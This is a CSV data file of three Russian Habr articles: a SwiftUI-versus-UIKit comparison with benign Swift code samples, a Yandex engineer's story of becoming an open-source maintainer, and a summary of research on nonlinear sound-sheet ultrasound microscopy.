,title,namecompany,description,rating,field,date,textpub
0,SwiftUI или UIKit: что выбрать для iOS-приложений?,М.Видео-Эльдорадо,30 лет в топе,0,Электронная коммерция,2025-04-11,"Привет, Хабр! Сегодня мы в коротком формате сравним SwiftUI и UIKit: где SwiftUI реально выигрывает, а где старый добрый UIKit остаётся незаменимым.Архитектурные различияUIKit В UIKit вы вручную создаёте экземпляры UIViewController, добавляете UIView, настраиваете AutoLayout (или пишете frame-based лэйауты, если душа требует свободы) и связываете события через делегаты или target-action.Например, форма авторизации на UIKit может выглядеть так:import UIKit  class LoginViewController: UIViewController {          private let usernameField: UITextField = {         let field = UITextField()         field.placeholder = ""Логин""         field.borderStyle = .roundedRect         return field     }()          private let passwordField: UITextField = {         let field = UITextField()         field.placeholder = ""Пароль""         field.borderStyle = .roundedRect         field.isSecureTextEntry = true         return field     }()          private let loginButton: UIButton = {         let button = UIButton(type: .system)         button.setTitle(""Войти"", for: .normal)         return button     }()          override func viewDidLoad() {         super.viewDidLoad()         view.backgroundColor = .white                  view.addSubview(usernameField)         view.addSubview(passwordField)         view.addSubview(loginButton)                  setupConstraints()     }          private func setupConstraints() {         usernameField.translatesAutoresizingMaskIntoConstraints = false         passwordField.translatesAutoresizingMaskIntoConstraints = false         loginButton.translatesAutoresizingMaskIntoConstraints = false                  NSLayoutConstraint.activate([             usernameField.centerXAnchor.constraint(equalTo: view.centerXAnchor),             usernameField.topAnchor.constraint(equalTo: view.topAnchor, constant: 200),             usernameField.widthAnchor.constraint(equalToConstant: 250),                          passwordField.centerXAnchor.constraint(equalTo: view.centerXAnchor),             passwordField.topAnchor.constraint(equalTo: usernameField.bottomAnchor, constant: 20),             passwordField.widthAnchor.constraint(equalTo: usernameField.widthAnchor),                          loginButton.centerXAnchor.constraint(equalTo: view.centerXAnchor),             loginButton.topAnchor.constraint(equalTo: passwordField.bottomAnchor, constant: 20)         ])     } } Здесь не только создаётся три элемента, но ещё и вручную настраиваются констрейнты. Контроль полный, но код получается многословным и порой бессмысленно шаблонным.SwiftUISwiftUI предлагает совершенно другой взгляд – вы описываете, что должно быть на экране, и система сама решает, как это отрисовать.Пример той же формы авторизации на SwiftUI:import SwiftUI  struct LoginView: View {     @State private var username = """"     @State private var password = """"          var body: some View {         VStack(spacing: 20) {             TextField(""Логин"", text: $username)                 .textFieldStyle(RoundedBorderTextFieldStyle())                 .padding(.horizontal, 20)                          SecureField(""Пароль"", text: $password)                 .textFieldStyle(RoundedBorderTextFieldStyle())                 .padding(.horizontal, 20)                          Button(""Войти"") {                 // Логика авторизации                 print(""Попытка входа с логином \(username)"")             }             .padding()             .background(Color.blue)             .foregroundColor(.white)             .cornerRadius(8)         }         .padding()     } }  struct LoginView_Previews: PreviewProvider {     static var previews: some View {         LoginView()     } } Как видите, код становится компактнее, понятнее и, что самое главное, декларативнее. Вам не нужно заботиться о констрейнтах – SwiftUI сам позаботится о лэйауте. Но вот за кажущейся простотой скрываются алгоритмы diffing-а, которые при каждом изменении состояния пересчитывают всё дерево представлений.ПроизводительностьКак видите, код становится компактнее, понятнее и, что самое главное, декларативнее. Вам не нужно заботиться о констрейнтах – SwiftUI сам позаботится о лэйауте. Но вот за кажущейся простотой скрываются алгоритмы diffing-а, которые при каждом изменении состояния пересчитывают всё дерево представлений.ПроизводительностьUIKitUIKit напрямую работает с CALayer и Core Animation. Это даёт возможность оптимизировать производительность на уровне отрисовки, кешировать содержимое, управлять GPU-ресурсами. Если есть огромный список данных, используется UITableView или UICollectionView с механизмом повторного использования ячеек. Можно вручную настроить estimatedRowHeight и rowHeight, чтобы добиться оптимального баланса между производительностью и точностью лэйаута:tableView.estimatedRowHeight = 44tableView.rowHeight = UITableView.automaticDimensionКроме того, можно проследить цепочку отрисовки через инструменты типа Instruments, анализируя каждую фазу и устраняя узкие места.SwiftUISwiftUI работает на основе механизма, который сравнивает старое и новое дерево представлений при изменении состояния. Если вы не оптимизируете список с помощью правильного указания id или использования модификаторов типа EquatableView, система может пересоздавать большое количество элементов, что приводит к лишним пересчётам. Вот типичная ошибка:List(0..<1000) { index in    Text(""Элемент \(index)"")}Каждое изменение состояния заставляет SwiftUI пересчитывать все 1000 элементов. Правильное решение – указать идентификатор:List(0..<1000, id: \.self) { index in    Text(""Элемент \(index)"")}Это позволяет системе понять, что элементы не изменились, и избежать ненужной перерисовки.АнимацииUIKitВ UIKit анимации строятся через UIView.animate и Core Animation. Можно задавать свои кривые, управлять задержками, комбинировать анимации и контролировать продолжительность и синхронизацию. Это позволяет создавать сложные визуальные эффекты, требующие точной настройки:UIView.animate(withDuration: 0.3, delay: 0, options: [.curveEaseInOut], animations: {    self.view.alpha = 0.5}, completion: nil)SwiftUISwiftUI предлагает анимации через обёртку withAnimation – изменяете состояние, и все изменения плавно перерисовываются.withAnimation {    opacity = 0.5}Но если нужно что-то более сложное – например, кастомные кривые анимации, последовательные переходы или контроль над фазами анимации – может понадобиться уйти в UIKit или использовать комбинированный подход. В SwiftUI анимации зачастую ограничены декларативным описанием, и для нестандартных эффектов приходится прибегать к трюкам или даже интегрировать UIViewRepresentable для встраивания UIKit-компонентов.Управление состояниемОдним из главных козырей SwiftUI является его встроенная система управления состоянием. Используя свойства типа @State, @Binding, @ObservedObject и @EnvironmentObject, можно буквально забыть о том, что происходит – система сама обновляет интерфейс при изменении данных. Это выглядит очень и просто, но, как известно, за такой декларативной простотой скрывается тонкая настройка. Если не структурировать данные правильно, можно столкнуться с лишними обновлениями, или с зацикливанием обновлений, когда одно изменение запускает цепную реакцию перерасчётов.Пример наблюдаемого объекта в SwiftUI:import SwiftUI import Combine  class UserViewModel: ObservableObject {     @Published var username: String = """"     @Published var isLoggedIn: Bool = false } Здесь все обновления происходят автоматически: как только вы изменяете username или isLoggedIn, все представления, зависящие от этих данных, перерисовываются.В UIKit ситуация совсем иная. Здесь управление состоянием зачастую реализуется через делегаты, нотификации или архитектурные паттерны вроде MVC и MVVM.Например, рассмотрим два способа отслеживания изменений в UIKit.Создадим модель с делегатом, чтобы уведомлять об изменениях:protocol UserModelDelegate: AnyObject {     func userModelDidUpdate(_ model: UserModel) }  class UserModel {     weak var delegate: UserModelDelegate?          var username: String {         didSet {             delegate?.userModelDidUpdate(self)         }     }          init(username: String) {         self.username = username     } } А теперь – UIViewController, который будет следить за изменениями:import UIKit  class UserViewController: UIViewController, UserModelDelegate {     var userModel = UserModel(username: ""Начальное имя"")          override func viewDidLoad() {         super.viewDidLoad()         view.backgroundColor = .white         userModel.delegate = self                  // Симулируем обновление через 2 секунды         DispatchQueue.main.asyncAfter(deadline: .now() + 2) {             self.userModel.username = ""Новое имя""         }     }          func userModelDidUpdate(_ model: UserModel) {         print(""Делегат: имя пользователя изменилось на \(model.username)"")         // Здесь можно обновить UI, если требуется     } } Если хотите еще большей автоматизации без явных вызовов делегата, можно использовать KVO:import Foundation  class UserModel: NSObject {     @objc dynamic var username: String          init(username: String) {         self.username = username         super.init()     } } Настроим наблюдение в контроллере:import UIKit  class UserViewController: UIViewController {     var userModel = UserModel(username: ""Начальное имя"")     var observation: NSKeyValueObservation?          override func viewDidLoad() {         super.viewDidLoad()         view.backgroundColor = .white                  observation = userModel.observe(\.username, options: [.old, .new]) { model, change in             if let oldValue = change.oldValue, let newValue = change.newValue {                 print(""KVO: имя пользователя изменилось с \(oldValue) на \(newValue)"")             }         }                  // Симулируем обновление через 2 секунды         DispatchQueue.main.asyncAfter(deadline: .now() + 2) {             self.userModel.username = ""Новое имя""         }     }          deinit {         observation?.invalidate()     } } В обоих случаях получаем полный контроль над моментами обновления, хотя и жертвуете простотой декларативного подхода SwiftUI. Разница в том, что в UIKit ответственность за управление состоянием лежит на вас – и это может быть как преимуществом, так и источником ошибок, если не уделить должного внимания оптимизации.Кстати, на основе этого опыта наши приложения М.Видео и Эльдорадо обновлены и снова доступны в AppStore – мы интегрировали современные технологии, сохранив проверенную временем стабильность.Теперь у нас:Обновлённый дизайн – используя гибридный подход UIKit и SwiftUI.Быстрая работа – оптимизированная загрузка страниц, умное кеширование.Новый поиск – лучше, быстрее, удобнее.Поддержка бонусов – единый счёт в М.Клубе.Так что если у вас iPhone – пора обновить приложение!Скачать приложение М.Видео в AppStore. Скачать Эльдорадо в AppStore.Спасибо, что дочитали до конца! "
1,"Как коммитить так, чтобы ваш код принимали мейнтейнеры: путь одного героя",Яндекс,Как мы делаем Яндекс,0,"Поисковые технологии, Мобильные технологии, Веб-сервисы",2025-04-11,"Всем привет, меня зовут Юрий Пузыня, я занимаюсь развитием платформы документации Diplodoc в Yandex Infrastructure, которую мы пару лет назад выложили в опенсорс. И сегодня я расскажу лёгкую историю невероятного везения в опенсорсе. Мой первый коммит как контрибьютора в опенсорс‑проект был смёржен спустя два с половиной года мной же в качестве мейнтейнера этого проекта. И в чём тут история успеха — спросите вы. Но давайте я расскажу всё по порядку. Глава 1, в которой герой знакомится с опенсорсом и учится всё делать правильноЭта история началась, когда я работал в маленькой компании, в которой продажников было больше, чем программистов, и времени на изучение и внедрение новых технологий не было совсем. Мы деплоились в продакшн через Rsync, важный код хранили в SVN, неважный — просто на локальных компьютерах. А во время обедов обсуждали, что неплохо было бы внедрить Jira или Redmine в качестве таск‑трекера. И тестировались мы часто прямо на проде, руками откатывались, снова выкатывались. Всё это было крайне неэффективно, но мы разрабатывались как могли. Но однажды настал тот день, когда пришло время воспользоваться новой технологией на работе, и я долго пытался разобраться, почему она не работает так, как написано в документации, а в некоторых случаях — не работает вообще. Потратил много времени на поиск в интернете и понял, что технология выложена в опенсорс и готова к улучшениям от любого желающего. «Пришло моё время», — подумал я. Воодушевившись и вооружившись энергетиками, коль здоровье ещё позволяло, я за пару дней или даже, скорее, ночей разобрался с необходимой мне проблемой, попутно починил ещё парочку. Разобрался, как оформить свой первый пул‑реквест на Github — это для меня был первый опыт, я только начинал разрабатывать. И нажал заветную кнопку Create pull request и, прямо скажем, ворвался в опенсорс с ноги. Тогда я был «зелёным» контрибьютором и видел лишь тот проект, который хотелось улучшить… Так моя история могла бы закончиться, но мне повезло, и на проекте меня ждал очень опытный и терпеливый мейнтейнер, который помог мне сделать первые шаги в опенсорсе. …но вскоре по ту сторону интернета появился второй герой — мейнтейнерЧерез два дня в моём пул‑реквесте появился первый комментарий, смысл его был таким: «Здравствуйте, спасибо за ваш вклад в проект. К сожалению, сложно понять, что в точности здесь происходит. Возможно ли разбить пул‑реквест на несколько частей?» Меня этот комментарий удивил своей вежливостью и заставил подумать, как сделать пул‑реквест лучше. И придумал я небольшой багфикс, который можно оформить отдельно. Оформил 47 строчек кода, дождался следующего фидбека, в котором меня просили всё описать. Мне это показалось странным. Мол, 47 строчек кода, казалось бы, прочитай 47 строчек — всё пойми. Но спустя много лет я понял, что описание нужно не только мейнтейнеру и контрибьютору, оно нужно будет ещё и всем, кто это будет когда‑нибудь читать ради истории, чтобы понять, что там происходило. Добавил описание, снова залил изменения на сервер, и теперь меня попросили написать тесты. Сейчас это не кажется удивительным, но тогда мне, человеку, который вообще не писал ни разу тесты, было, конечно, волнительно. К счастью, мейнтейнер мне оставил подробные инструкции о том, как пишутся в этом проекте тесты, куда их лучше написать. Я справился достаточно быстро, залил и эти изменения на сервер, и тут практически моментально получил заветный бейдж Merged.Я пытался лениться, но мне не дали: на пятом пул‑реквесте я понял, что всегда будут описания, тесты и хорошие названия коммитов. Мы перестали тратить время на ожидание обратной связи, и дело пошло быстрее. На этом этапе я сделал для себя несколько выводов: Не торопитесь. Опенсорс — это про взаимовыгодный обмен временем. Это действительно должно быть выгодно и вам, и мейнтейнеру. Да, вам может быть не очень приятно постоянно писать тесты, но вы на этом можете развиваться и учиться.Изучите требования. Старайтесь выполнять те требования, которые на проекте уже есть, чтобы сэкономить время своего старта. Это максимально сокращает бесполезную коммуникацию. Начните с малого. Если вам кажется, что первое изменение невозможно разделить на части, то лучше начать с другого исправления, может быть, с чего‑то поменьше, чтобы вы почувствовали проект. Поймите, устраивают ли вас процессы. Действительно ли вам выгодно работать с этим проектом? Потому что вы ни в коем случае не должны чувствовать дискомфорт в опенсорсе. Иногда это повод сменить проект, иногда — поговорить с контрибьютором, иногда — прочитать документацию проекта, чтоб понять, чего от вас ждут. Глава 2, в которой герой что-то теряет, расстраивается, но потом находит и снова становится счастливымШли месяцы на опенсорс‑проекте, и я понял, что мне уже не хочется идти на основную работу, так как на ней нет того, к чему я привык: хорошо настроенного CI/CD‑цикла, таск‑трекера, автоматического тестирования и, главное, не было Git. Чтобы вернуть мотивацию, я решил менять реальность вокруг себя и внедрять в работу технологии, которые попробовал на опенсорсе. И тогда опенсорс перестал быть для меня бесплатным — на основной работе меня стали больше ценить и повышать мне зарплату. Глава 3, в которой герои учатся работать вместеК концу первого года участия в опенсорс‑проекте я пришёл к своему следующему кризису. Я достаточно хорошо знал проект, у меня уже появилась собственная стратегия. Я открывал от двух до пяти пул‑реквестов в день, но всё чаще они отклонялись, или обсуждения с мейнтейнером затягивались так, что уже ничего не хотелось. Я стал хуже спать, потому что не понимал, что происходит и как это всё поправить. Назревала буря. Думал либо отказаться полностью от проекта, над которым я работаю, либо, что ещё хуже, форкнуть его. И тут мне снова повезло — мейнтейнер проявил инициативу и предложил всё обсудить. Впервые за год я общался с человеком не в пул‑реквестах, а в другом канале — тогда ещё было модно вести основательные дискуссии в почте. Буквально за одну сессию переписки в почте мы с мейнтейнером решили все проблемы. Договорённости были довольно банальными: проект был уже большой, и на нём нужно разделять области ответственности и проработать API для расширяемости проектов. Со временем в опенсорс-проекте появляются новые ролиТакже все дальнейшие большие изменения мы будем заранее обсуждать в Issue, до того как будет написан какой‑либо код, чтобы потом никто не обижался, что эти изменения не нужны. Нам очень помог Extension API — можно было части своего проекта выносить в отдельные репозитории, развивать по своим правилам и говорить сообществу — пользуйтесь на свой страх и риск. Это ускоряет разработку. Я описал решение конкретной проблемы, которых может быть много на проекте, но самое важное — помнить, что мейнтейнер не робот, это человек, с которым можно поговорить и договориться. В этой истории помогли новые каналы коммуникации, но здесь я бы хотел вас предостеречь. Если вы только пришли на проект, будет плохим тоном искать альтернативные каналы коммуникации. Представьте, мейнтейнер вас не знает, а вы стучитесь ночью к нему в личку и рассказываете свою гениальную идею, как сделать его проект лучше. Я после такого, скорее всего, добавлю человека в чёрный список и продолжу жить спокойно. Глава 4, в которой все начинают говорить на одном языкеШёл второй год работы над проектом, и я был уже не контрибьютором, а мейнтейнером, что накладывало на меня дополнительные задачи, активности, которые мне в большинстве своём нравились. И мне нравилось общаться: мы общались на английском, и это была отдельная интересная задача — коммуницировать с тем, кто далеко от тебя, но вас объединяет одно общее дело. Были сложные архитектурные обсуждения, и мне тоже это очень нравилось, потому что я не чувствовал себя каким‑то суперопытным разработчиком и смотрел, с кем я участвую в дискуссиях, наблюдал за их умными мыслями. В какой‑то момент осознавал, что я уже могу генерировать свои мысли, пожалуй, тоже умные. И, безусловно, было приятно. Потом начались локальные митапы для популяризации технологии, и это был мой первый, незабываемый опыт публичных выступлений. Всё это было бонусами к тому, что я стал мейнтейнером, но были и нюансы. Я начал замечать, что я абсолютно не справляюсь с локальной коммуникацией на проекте. То, что давалось предыдущему мейнтейнеру так легко — он с таким терпением помогал мне пройти мои первые шаги, — я этого совершенно не умел. И когда я смотрел, например, на какой‑нибудь issue с названием Something went wrong…, я даже иногда впадал в панику, уходил пить чай и не возвращался. Ну не хочется заходить в такой issue. Хочется что‑нибудь типа: конкретное название ошибки в таком‑то компоненте. Желательно, чтобы первой же строчкой внутри issue было «я готов сам починить». Другая проблема, когда не просто неинформативное название ошибки, а настоящая паника: всё сломано, срочно сюда ваше внимание нужно! Ещё меньше хочется таким заниматься. А чего хотелось бы? Хотелось бы, опять же, конструктива: «Фатальная ошибка в самом начале работы с приложением». И тогда я как мейнтейнер, конечно, поставлю на такой issue бейджик крайней важности и, скорее всего, сам пойду чинить: если моё приложение полностью не работает, я не могу бесконечно долго ждать, когда кто‑то за меня это починит. Проблемно было и если какой‑нибудь пользователь писал две страницы текста, пытаясь задать вопрос где‑то в середине, но когда ты уже дочитал до конца — ты не понимаешь, в чём именно вопрос, о чём вообще речь. И уходишь думать — наверно, там было что‑то важное, и думаешь: «Сейчас попью чайку и ему отвечу». И тоже не возвращаешься. Я понял, что это проблема не только моих пользователей, но и моя собственная. И чтобы снизить эту нагрузку на себя и на проект, я сделал contribution‑гайды, issue template, pull request template. И стало попроще. Бóльшая часть issue и пул‑реквестов стали открываться в правильном виде, стало поприятнее в них заходить.Отдельная проблема — когда разработчики создают пул‑реквесты без оглядки на проект в целом. Перед тем как предложить правки, стоит потратить чуть больше времени и понять, там ли вы видите проблему. Может быть, 10 коммитов назад всё так и было задумано, а если это проблема — докажите, пожалуйста, что это действительно так. Вернитесь в историю на 10 коммитов назад и покажите, с чего всё началось, чтобы я мог дать конструктивный фидбек. Без этого мне приходилось самому заходить в такие пул‑реквесты и думать: «Как мы такое вообще допустили?», и идти самому по этой истории. Мейнтейнеров часто меньше, чем контрибьюторов, и важно уважать их время и максимально им помогать. Итак, советы для мейнтейнеров: Рефлексируйте над тем, что происходит на вашем проекте и почему он, возможно, доставляет вам дискомфорт. Структурируйте места, которые помогают вам оптимизировать процессы, — в моём случае contribution‑гайды, issue template, pull request template и так далее.И неоднозначный, но за годы практики всё‑таки очень важный совет: если вы считаете, что на вашем проекте всё хорошо, и этому уже есть много подтверждений — игнорируйте плохие описания issue и пул‑реквестов. Если люди не справляются с десятой попытки, уже после того как вы выдали им личные инструкции, я вам советую не тратить на них время, потому что они не тратят его в должной степени на вас. Напоминаю, опенсорс — это взаимовыгодный обмен временем. Глава 5, в которой герой наконец решает свою задачу спустя два с половиной годаВ качестве мейнтейнера у меня появилось больше возможностей по внесению изменений в проект. Во‑первых, уже было срезано очень много углов по тому, как проводить коммиты до прода. Это уже были не те процессы, с которыми я встретился вначале. Я не стал писать меньше тестов, их осталось столько же, просто мне не обязательно было теперь ждать апрува от соседнего мейнтейнера на каждое изменение. Мы ревьюили исключительно самые большие, важные, а в остальное время я развивал проект почти самостоятельно.А с какого-то этапа к проекту всё больше подключается комьюнитиИз того пул‑реквеста, который был у меня изначально, на 5000 строк кода, к этому моменту осталось всего 36. Всё остальное я за это время каким‑то образом вынес оттуда. И на самом деле смёржить этот пул‑реквест было уже делом принципа, потому что в нём не было ничего полезного, скорее всего, там были только строчки какой‑нибудь документации. Проект за это время сильно разросся: то есть мои 5000 строк превратились, скорее всего, где‑то тысяч в 40 и были написаны уже не только мной, но и всем комьюнити. Да и на самом деле то, что я принёс вначале, было неправильным, недостаточным, и мне помогли с этим разобраться. В этом и есть суть опенсорса. ЭпилогКогда я только попал в опенсорс, повезло с мейнтейнером. Это был потрясающий человек, кажется, из Чехии, с невероятным терпением. Он на долгие годы стал моим ментором. То есть я, вообще, заходил в опенсорс, чтобы решить свою задачу, не знал, что есть другие причины, чтобы этим заниматься. Но как только я пришёл в опенсорс, оказалось, что на самом деле основная моя потребность — это обучение и развитие. Я как‑то это прочувствовал сразу на проекте и начал черпать из общения со своим ментором кучу информации. Мне повезло и с самим проектом, потому что он рос вместе со мной. Мои потребности на проекте менялись. То есть сначала это было обучение и развитие, потом мне стало больше интересно именно взаимодействие с комьюнити. Участие в митапах давало мне какое‑то чувство собственной важности, и проект мне всё это позволял. Мне повезло с этим проектом в последний раз, когда необходимо было от него отказаться. Так бывает, что ваши дороги с конкретным опенсорсом расходятся, потому что вы его переросли. В моём случае я устроился в IT‑компанию и появились другие приоритеты. И в этот момент так получилось, что мою технологию заменили на рынке на более интегрированную в основные продукты, и я смог достаточно легко повесить бейджик «Заархивирован» на свой проект, сказать коммьюнити спасибо, и мы пошли приносить в пользу дальше в опенсорсе, в других проектах. Очень сложно сделать выводы из истории, где постоянно везло. Но главный вывод будет в том, что, несмотря на везение, полагаться на него не нужно, а нужно постоянно рефлексировать. Если в какой‑то момент вам почему‑то опенсорс не нравится, на это точно есть очевидная причина, и она может быть очень легко исправлена, потому что в опенсорсе самые классные люди, здесь всегда можно договориться. Самые классные, самые умные, самые безвозмездные. И, договорившись с этими людьми, вы можете помочь им улучшить какие‑то процессы, документации, чтобы стало понятнее, как с этим всем работать. Но если это всё не помогает — это очень спорный пункт, мы долго думали, добавлять его или нет, — игнорируйте. Бывает, что проект действительно вам не подходит. Бывает, что проект не подходит никому, и такие проекты закрываются. В опенсорсе тоже есть конкуренция, но она выражается не в деньгах, а в качестве проектов.Проектов в опенсорсе достаточно для того, чтобы выбрать себе хороший, и недостаточно для того, чтобы мы все тут сидели поодиночке. Нам приходится на хороших проектах собираться в группы, что прекрасно. Кстати, у нас в Diplodoc есть целая небольшая программа для контрибьюторов с призами и славой. Спасибо, что прочитали. Приятного вам опенсорса! "
2,УЗИ-микроскопия капилляров и клеток,ua-hosting.company,Хостинг-провайдер: серверы в NL до 300 Гбит/с,0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-11,"  Одним из самых распространенных инструментов современной диагностики является ультразвуковая (УЗД или УЗИ). Данный метод позволяет рассмотреть внутренние органы человека, оценить их структурное и морфологические особенности и выявить те или иные отклонения. Недооценивать важность УЗИ невозможно, но стоит отметить не безграничность его возможностей. Сосудистая или клеточная структуры остаются вне поля зрения УЗИ, по крайней мере, так было раньше. Ученые из Делфтского технического университета (Делфт, Нидерланды) разработали новый метод микроскопии на основе ультразвука. Из чего состоит новая система, как именно она работает, и что позволяет увидеть? Ответы на эти вопросы мы найдем в докладе ученых.  Основа исследования Наиболее информативным методом наблюдения динамических клеточных процессов in vivo в трехмерном пространстве является микроскопия светового листа, которая использует генетически кодированные флуоресцентные репортеры. Последовательные достижения в микроскопии светового листа теперь позволяют быстро, в больших объемах и с высоким разрешением получать изображения флуоресцентно меченых клеток в прозрачных или очищенных организмах. Эти возможности оказали огромное влияние на биологию развития, обеспечив долгосрочную визуализацию эмбриогенеза.  Следующим рубежом станет достижение нетоксичной визуализации глубоких тканей с клеточной точностью в живых непрозрачных организмах. К сожалению, ограничения, присущие оптической микроскопии (глубина проникновения < 1 мм и фототоксичность), препятствуют крупномасштабной визуализации в непрозрачных тканях. Кроме того, быстрая визуализация светового листа пока не достигает объемных скоростей 1 мм3/с в живой ткани, что делает динамическую визуализацию в мезомасштабе технически сложной.  Введение биогенных газовых везикул (GV от gas vesicle) в качестве «зеленого флуоресцентного белка для ультразвука» обеспечивает альтернативу свету для крупномасштабной клеточной визуализации. Удачная физика ультразвука позволяет проводить сантиметровое глубинное сканирование тканей млекопитающих, в то время как генетически закодированные GV могут связывать ультразвуковые волны с клеточной функцией. Чтобы раскрыть потенциал акустических репортерных генов (ARG от acoustic reporter gene) на основе GV и биосенсоров, необходимы методы ультразвуковой визуализации с высоким содержанием информации, разрешением, охватом и транслируемостью. В последнее время функциональная ультразвуковая 4D нейровизуализация и 3D ультразвуковая локализационная микроскопия позиционировали ультразвук как инструмент для фундаментальных биологических исследований. Однако по-прежнему невозможно визуализировать клеточную функцию в трех измерениях или обнаруживать капиллярные сети.  В рассматриваемом нами сегодня труде ученые представили нелинейную звуковую листовую микроскопию (NSSM от nonlinear sound-sheet microscopy), метод визуализации целевых биологических функций в см3 непрозрачной живой ткани. NSSM опирается на большое поле зрения, высокочастотную адресную решетку преобразователей строк и столбцов (RCA от row-column addressed) и передачу недифрагирующих ультразвуковых лучей для обнаружения клеток, помеченных GV, или сосудов, помеченных микропузырьками (MB от microbubble). NSSM расширяет поле зрения биомолекулярного ультразвука на частоте 15 МГц с ~3.5 x 64 x 100 λ3 до 80 x 80 x 100 λ3 (где λ обозначает длину волны ультразвука), верхнюю границу скорости 2D-визуализации с 400 Гц до 25.6 кГц и пространственное разрешение с 1 x 1 x 3.5 λ3 до 1 x 1 x 0.6 λ3. Универсальность NSSM была продемонстрирована выполнением объемной визуализации экспрессии генов в модели рака и нелинейным акустическим секционированием живой церебральной сосудистой сети вплоть до капиллярного масштаба. На протяжении всего исследования NSSM сравнивался с линейной визуализацией в качестве референса.  Концепция NSSM  Изображение №1  В парадигме NSSM субапертура элементов RCA-преобразователя Nap (1A) используется для передачи перекрестно распространяющихся ультразвуковых плоских волн или X-волн из двух соседних полуапертур под углами α и −α (1B). Эта пространственно структурированная ультразвуковая передача приводит к возникновению недифракционного поля акустического давления в плоскости XZ, демонстрирующего двойное акустическое давление вдоль главного лепестка луча, и плосковолнового акустического поля давления в плоскости YZ (1C).  Акустическое давление далее модулируется вдоль главного лепестка недифракционного луча с использованием последовательности импульсов перекрестной амплитудной модуляции (xAM от cross amplitude modulation) (1D), которая ограничивает нелинейное рассеяние тонким звуковым листом с постоянной шириной луча независимо от глубины (1E). Звуковой листовой луч простирается до глубины перекрестного распространения zcp = Nap / 2, которая обычно составляет порядка 100λ. 2D-изображения реконструируются из отраженных ультразвуковых эхо-сигналов, полученных на элементах ортогональной решетки RCA (1B), с использованием алгоритма формирования луча с задержкой и суммой.  Функции рассеяния точки (PSF от point spread function) резонансных MB сообщаются (1F) для линейной визуализации или SSM (т. е. только передача TX1) и NSSM (т. е. передачи TX1-TX2-TX3). Ученые выбрали MB в качестве нелинейных точечных целей при моделировании, а не GV, поскольку известны уравнения, регулирующие их вибрацию в ультразвуковом поле. Изображения SSM и NSSM в плоскости XZ показали схожие PSF, поскольку оба режима визуализации работают на одной и той же частоте (1G).  Для сканирования объема передачи звукового листа электронно перемещаются вдоль двух массивов RCA-преобразователя с использованием скользящей апертуры элементов (1H). Точность микросканирования (λ/2) достигается путем чередования передач с и без бесшумного элемента в центре субапертуры (1H), поскольку шаг (p) или межэлементное расстояние RCA приблизительно равно λ. 3D PSF представлены на 1I.  Было показано, что нелинейная визуализация снижает уровни вторичных лепестков 3D PSF на 12.8 дБ ± 4.4 дБ благодаря ограничению нелинейного рассеяния MB плоскостью звукового листа. С точки зрения разрешения, NSSM предоставил среднюю 3D функцию рассеяния точки 1λ х 0.6λ х 0.6λ по сравнению с 1λ х 0.9λ х 0.9λ для SSM (1J).  Результаты исследования  Изображение №2  Нелинейная ультразвуковая визуализация является ключом к обнаружению GV в контексте ткани с высокой специфичностью. Чтобы проверить способность NSSM визуализировать генетическую экспрессию в 3D, ученые сначала визуализировали GV, адаптированные как нелинейные бактериальные ARG (изображение №2). GV Anabaena flos aquae очистили и внедрили их в акустически прозрачные фантомы в концентрациях в диапазоне оптических плотностей (OD от optical density) при 500 нм от 0.5 до 2, тем самым имитируя повышение уровней экспрессии в клетках (2A). Фантом был отсканирован с помощью ортогональной последовательности NSSM с использованием шага сканирования 55 мкм. SSM обнаружила скважины GV при всех концентрациях (2B) и нормализованные отношения контрастности к шуму (CNR от contrast-to-noise ratio), масштабированные с шагом 6.9 дБ в среднем от -20.8 дБ для OD 0.5 до 0 дБ для OD 2. NSSM также обнаружила скважины GV при всех концентрациях (2C) и продемонстрировала больший динамический диапазон в 33 дБ между скважиной GV при OD 0.5 и скважиной GV при OD 2. Наблюдалось меньшее увеличение CNR от OD 1.5 до OD 2, что может быть связано с затуханием ультразвука, зависящим от давления, в среде, содержащей изгибающиеся GV.  Далее ученые проверили способность NSSM визуализировать экспрессию бактериального ARG, что представляет особый интерес для области инженерных бактериальных биосенсоров и терапевтических средств. Были использованы два разных штамма E. coli, контрольный штамм и штамм, трансфицированный плазмидой pBAD-bARGSer, что приводит к внутриклеточной продукции Serratia GV, которые конститутивно производят нелинейное рассеяние (2D). Оба штамма бактерий были помещены в агаровые фантомы и визуализированы с помощью NSSM (2E). Объемы визуализации 8.8 x 8.8 x 10 мм3 были реконструированы из 108 положений сканирования звуковых листов RCA-преобразователя (2G). Как и ожидалось, контрольный штамм не показал никакого нелинейного контраста, тогда как бактерии, экспрессирующие Serratia GV, были обнаружены как в 2D, так и в 3D (2E-2G). NSSM обнаружил нелинейные бактериальные ARG с CNR 27 дБ.   Изображение№3  Также была исследована способность NSSM визуализировать ARG млекопитающих (mARG) в мышиной модели рака. Ортотопические опухоли были вызваны билатерально в жировых отложениях молочной железы самок мышей с ослабленным иммунитетом путем инъекции раковых клеток, сконструированных для создания нелинейно рассеивающих GV (3A). Экспрессия mARG in vivo была вызвана инъекциями доксициклина каждый день до 4-го или 8-го дня. Опухоли были визуализированы на 4-й день после индукции у 3 мышей и на 8-й день после индукции у 2 мышей.  В то время как SSM визуализация выявила анатомические структуры, включая опухолевые массы, NSSM успешно выявил пространственные паттерны экспрессии mARG в этих опухолевых массах (3B). На 8-й день после индукции NSSM выявил некротическое ядро опухолей молочной железы через отсутствие экспрессии генов. Высокая специфичность NSSM, которая устойчива к артефактам нелинейного распространения волн, была ключевой для этого экспериментального наблюдения. Объемная визуализация позволила отобразить поперечные сечения экспрессии mARG в плоскости XY, называемые C-сканированием (правая колонка на 3B). Опухоли были четко обнаружены на обеих стадиях, но некротические ядра были видны только на 8-й день после индукции.  Объемный NSSM, объединенный с анатомической SSM визуализацией, представлен на 3C. Общий сканированный объем простирается на 8.8 х 8.8 х 9 мм2 и был получен с шагом сканирования 55 мкм вдоль каждого массива RCA-преобразователя. На 3C показаны поперечные сечения экспрессии генов в плоскостях XZ, YZ и XY, иллюстрирующие возможности трехмерной навигации NSSM. Количественная оценка объемов опухолевых и некротических ядер была выполнена с помощью автоматического конвейера сегментации (3D). На 4-й день после индукции объемы, измеренные с некротическими ядрами и без них, были схожи, тогда как на 8-й день после индукции объемы, измеренные с некротическими ядрами и без них, показали статистически значимую разницу. Представительная автоматическая сегментация контуров экспрессии генов опухоли представлена на 3D. В этом примере визуализации глубоких тканей, учитывая статическую природу экспрессии генов при использованной скорости визуализации, 2D NSSM работал со скоростью 930 кадров/с, тогда как ортогонально сканированный объемный NSSM работал со скоростью 4 объема/с. Однако в теории 3D NSSM может достигать 94 объемов/с для этого набора параметров визуализации. 